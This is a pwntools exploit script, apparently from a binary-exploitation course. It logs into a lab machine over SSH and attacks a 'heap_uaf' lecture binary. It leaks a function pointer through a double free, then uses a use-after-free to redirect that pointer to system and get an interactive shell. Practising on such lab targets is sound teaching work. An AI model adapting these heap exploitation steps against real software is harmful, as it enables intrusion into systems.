#!/usr/bin/env python3

import sys

from pwn import *

def main():

  session = ssh(host="192.168.159.129", user="lecture", password="lecture")
  sh = session.process("/bin/sh", env={"PS1":""})

  # start the heap use-after-free lecture sample
  sh.sendline("/levels/lecture/heap/heap_uaf")
  sh.read()

  log.info("Triggering double-free information leak vulnerability")
  leak = trigger_leak(sh)
  
  log.info("Leaked pointer to print_cool: 0x%x" % leak)
  ptr2system = leak + 0x9e  
  

  log.info("Triggering UAF, overwriting pointer to print_cool")
  exploit(sh, ptr2system)

  while True:
    sh.sendline("echo \"GULAG\"")
    if b"GULAG" in sh.read():
      break

  log.success("Exploitation complete, enjoy your shell")
  sh.interactive()


# exploit: trigger the user-after-free vulnerability and overwrite eip
def exploit(sh, ptr):

  sh.sendline("1")      # create a cool guy
  sh.read()
  sh.send("A" * 20)
  sh.read()

  sh.sendline("2")      # create a person
  sh.read()
  sh.sendline("A" * 16)
  sh.read()
  sh.sendline("A")
  sh.read()
  sh.sendline("A")
  sh.read()

  sh.sendline("4")      # delete a person => free(a_person)
  sh.read()

  sh.sendline("3")      # delete cool guy => free(coolguy)
  sh.read()

  sh.sendline("2")      # create a person
  sh.read()
  sh.sendline("wetw0rk")
  sh.sendline("%d" % ptr)
  sh.read()
  sh.sendline("1128481603")
  sh.read()

  sh.sendline("5")      # print cool guy / trigger overwrite
  sh.read()

  return

# trigger_leak: leverage the double free vulnerability to leak an address
def trigger_leak(sh):

  sh.sendline("1")      # create a cool guy
  sh.read()
  sh.send("A" * 20)
  sh.read()

  sh.sendline("2")      # create a person
  sh.read()
  sh.sendline("A" * 16)
  sh.read()
  sh.sendline("A")
  sh.read()
  sh.sendline("A")
  sh.read()

  sh.sendline("4")      # delete a person ( free(a_person) )-+
  sh.read()             #                                    |
                        #                                    |
  sh.sendline("3")      # delete cool guy ( free(coolguy) )  +- double free
  sh.read()             #                                    |
                        #                                    |
  sh.sendline("4")      # delete a person ( free(a_person) )-+
  sh.read()

  sh.sendline("1")
  sh.read()
  sh.send("A" * 20)
  sh.read()

  sh.sendline("6")      # print a person
  leak = sh.read()

  try:
    leak = int(leak.split(b'\n')[2].split(b" ")[3])
  except:
    log.failure("Failed to leak a pointer")
    exit(-1)

  return leak

main()
